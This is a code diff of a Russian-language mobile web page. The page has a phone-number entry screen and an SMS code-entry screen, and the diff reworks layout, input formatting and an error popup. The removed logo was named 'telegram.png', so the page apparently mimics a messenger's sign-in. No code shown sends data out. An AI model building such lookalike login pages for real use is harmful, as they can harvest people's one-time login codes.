@@ -34,6 +34,15 @@
             -ms-user-select: none;
         }
 
+        body.popup-active {
+            overflow: hidden;
+            pointer-events: none; /* Отключаем взаимодействие с фоном */
+        }
+
+        body.popup-active .popup {
+            pointer-events: auto; /* Включаем взаимодействие только с попапом */
+        }
+
         .container {
             text-align: center;
             color: #FFFFFF;
@@ -48,13 +57,13 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            transition: transform 0.5s ease, opacity 0.3s ease;
+            transition: opacity 0.3s ease;
             opacity: 1;
         }
 
         .container.hidden {
-            transform: translateX(-150%);
             opacity: 0;
+            pointer-events: none;
         }
 
         .logo {
@@ -86,12 +95,12 @@
             font-size: 14px;
             color: #8E8E93;
             line-height: 1.4;
-            margin-bottom: 20px;
+            margin-bottom: 40px;
         }
 
         .start-btn {
             position: absolute;
-            bottom: 80px;
+            bottom: 120px;
             left: 50%;
             transform: translateX(-50%);
             width: 100%;
@@ -124,17 +133,18 @@
             position: absolute;
             top: 0;
             left: 50%;
-            transform: translateX(50%);
+            transform: translateX(-50%);
             height: 100%;
             display: flex;
             justify-content: center;
-            transition: transform 0.5s ease, opacity 0.3s ease;
+            transition: opacity 0.3s ease;
             opacity: 0;
+            pointer-events: none;
         }
 
         .verification-screen.active {
-            transform: translateX(-50%);
             opacity: 1;
+            pointer-events: auto;
         }
 
         .code-screen {
@@ -145,24 +155,25 @@
             position: absolute;
             top: 0;
             left: 50%;
-            transform: translateX(50%);
+            transform: translateX(-50%);
             height: 100%;
             display: flex;
             justify-content: center;
-            transition: transform 0.5s ease, opacity 0.3s ease;
+            transition: opacity 0.3s ease;
             opacity: 0;
+            pointer-events: none;
             overflow: hidden;
             touch-action: none;
         }
 
         .code-screen.active {
-            transform: translateX(-50%);
             opacity: 1;
+            pointer-events: auto;
         }
 
         header {
             position: absolute;
-            top: 15px;
+            top: 30px;
             left: 50%;
             transform: translateX(-50%);
             width: 100%;
@@ -311,7 +322,7 @@
             transform: translateX(-50%);
             width: 100%;
             max-width: 320px;
-            background-color: #4D4D4D;
+            background-color: #007AFF;
             color: #fff;
             border: none;
             border-radius: 8px;
@@ -322,21 +333,12 @@
             transition: background-color 0.3s ease, transform 0.2s ease;
         }
 
-        .continue-btn.enabled {
-            background-color: #007AFF;
-        }
-
-        .continue-btn:disabled {
-            background-color: #4D4D4D;
-            cursor: not-allowed;
-        }
-
-        .continue-btn:not(:disabled):hover {
+        .continue-btn:hover {
             background-color: #005BB5;
             transform: translateX(-50%) scale(1.02);
         }
 
-        .continue-btn:not(:disabled):active {
+        .continue-btn:active {
             transform: translateX(-50%) scale(0.98);
         }
 
@@ -366,7 +368,7 @@
 
         .resend-link {
             position: absolute;
-            bottom: 20px;
+            bottom: 40px;
             left: 50%;
             transform: translateX(-50%);
             color: #007AFF;
@@ -377,6 +379,55 @@
 
         .resend-link:hover {
             opacity: 0.7;
+        }
+
+        .popup {
+            background-color: #1c1c1e;
+            color: white;
+            padding: 15px;
+            border-radius: 20px;
+            text-align: center;
+            width: 250px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            z-index: 1000;
+        }
+
+        .popup.active {
+            display: block;
+        }
+
+        .popup p {
+            margin: 0 0 15px;
+            font-size: 16px;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid #3a3a3c;
+        }
+
+        .buttons button {
+            background: none;
+            border: none;
+            color: #5e84ff;
+            font-size: 16px;
+            cursor: pointer;
+            width: 50%;
+            padding: 10px 0;
+        }
+
+        .buttons button:not(:last-child) {
+            border-right: 1px solid #3a3a3c;
+        }
+
+        .buttons button:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -419,11 +470,11 @@
                     <span>+7</span>
                     <span class="divider">|</span>
                 </div>
-                <input type="tel" id="phone-number" placeholder="000 000 0000" maxlength="10" pattern="[0-9]*" inputmode="numeric">
+                <input type="tel" id="phone-number" placeholder="000 000 0000" maxlength="12" pattern="[0-9 ]*" inputmode="numeric">
             </div>
         </div>
         
-        <button class="continue-btn" id="continue-btn" disabled>Продолжить</button>
+        <button class="continue-btn" id="continue-btn">Продолжить</button>
     </div>
 
     <div class="code-screen">
@@ -434,11 +485,11 @@
         <div class="content">
             <div class="verification-logo">
                 <div draggable="false" style="pointer-events: none;">
-                    <img src="https://i.postimg.cc/wBPN1Dtt/telegram.png" border="0" alt="telegram" class="phone-icon">
+                    <img src="https://i.postimg.cc/CMjdw2gt/f53d2db3262d9950d1e0fb1b74244d-removebg-preview.png" border="0" alt="new-icon" class="phone-icon">
                 </div>
             </div>
             <h1 class="title">Введите код</h1>
-            <p class="instruction">Мы отправили SMS с кодом проверки на Ваш телефон <span id="phone-display">+265 888 57 83 90</span>.</p>
+            <p class="instruction">Мы отправили SMS с кодом проверки на Ваш телефон <span id="phone-display">+7 000 000 0000</span>.</p>
             
             <div class="code-input">
                 <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric">
@@ -451,6 +502,14 @@
         <a href="#" class="resend-link">Не получили код?</a>
     </div>
 
+    <div class="popup" id="error-popup">
+        <p>Некорректный номер телефона. Попробуйте снова.</p>
+        <div class="buttons">
+            <button onclick="hidePopup()">OK</button>
+            <button onclick="alert('Свяжитесь с поддержкой!')">Помощь</button>
+        </div>
+    </div>
+
     <script>
         const container = document.querySelector('.container');
         const verificationScreen = document.querySelector('.verification-screen');
@@ -460,6 +519,8 @@
         const countrySelector = document.querySelector('.country-selector');
         const codeInputs = document.querySelectorAll('.code-input input');
         const phoneDisplay = document.getElementById('phone-display');
+        const errorPopup = document.getElementById('error-popup');
+        const body = document.body;
 
         function toggleCountryAnimation() {
             countrySelector.classList.add('clicked');
@@ -490,8 +551,11 @@
         }
 
         function showCodeScreen() {
-            const phoneNumber = phoneInput.value.replace(/\D/g, '');
-            const formattedPhone = `+7 ${phoneNumber.slice(0, 3)} ${phoneNumber.slice(3, 6)} ${phoneNumber.slice(6, 10)}`;
+            const phoneNumber = phoneInput.value.replace(/\D/g, ''); // Убираем все нечисловые символы
+            const formattedPhone = phoneNumber.length > 0 
+                ? `+7 ${phoneNumber.slice(0, 3)} ${phoneNumber.slice(3, 6)} ${phoneNumber.slice(6, 10)}`.trim()
+                : '+7'; // Если ничего не введено, показываем только префикс
+
             phoneDisplay.textContent = formattedPhone;
 
             verificationScreen.classList.remove('active');
@@ -500,23 +564,40 @@
             }, 50);
         }
 
+        function showPopup() {
+            errorPopup.classList.add('active');
+            body.classList.add('popup-active');
+        }
+
+        function hidePopup() {
+            errorPopup.classList.remove('active');
+            body.classList.remove('popup-active');
+        }
+
         phoneInput.addEventListener('input', function (e) {
             let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 3 && value.length <= 6) {
-                value = `${value.slice(0, 3)} ${value.slice(3)}`;
-            } else if (value.length > 6) {
-                value = `${value.slice(0, 3)} ${value.slice(3, 6)} ${value.slice(6, 10)}`;
+            if (value.length > 10) value = value.slice(0, 10); // Ограничиваем 10 цифрами
+            let formattedValue = '';
+            if (value.length > 0) {
+                formattedValue = value.slice(0, 3);
+                if (value.length > 3) {
+                    formattedValue += ' ' + value.slice(3, 6);
+                }
+                if (value.length > 6) {
+                    formattedValue += ' ' + value.slice(6, 10);
+                }
             }
-            e.target.value = value;
-
-            const isEmpty = value.length === 0;
-            continueBtn.disabled = isEmpty;
-            continueBtn.classList.toggle('enabled', !isEmpty);
+            e.target.value = formattedValue;
         });
 
         continueBtn.addEventListener('click', function () {
-            if (!continueBtn.disabled) {
-                showCodeScreen();
+            showCodeScreen();
+        });
+
+        // Закрытие попапа по клику на пустое место
+        document.addEventListener('click', function (e) {
+            if (errorPopup.classList.contains('active') && !errorPopup.contains(e.target)) {
+                hidePopup();
             }
         });
 
@@ -526,10 +607,9 @@
                 if (value.length === 1 && index < codeInputs.length - 1) {
                     codeInputs[index + 1].focus();
                 }
-                // Проверяем, заполнены ли все поля
                 const allFilled = Array.from(codeInputs).every(inp => inp.value.length === 1);
                 if (allFilled) {
-                    codeInputs[codeInputs.length - 1].blur(); // Скрываем клавиатуру
+                    codeInputs[codeInputs.length - 1].blur();
                 }
             });
 
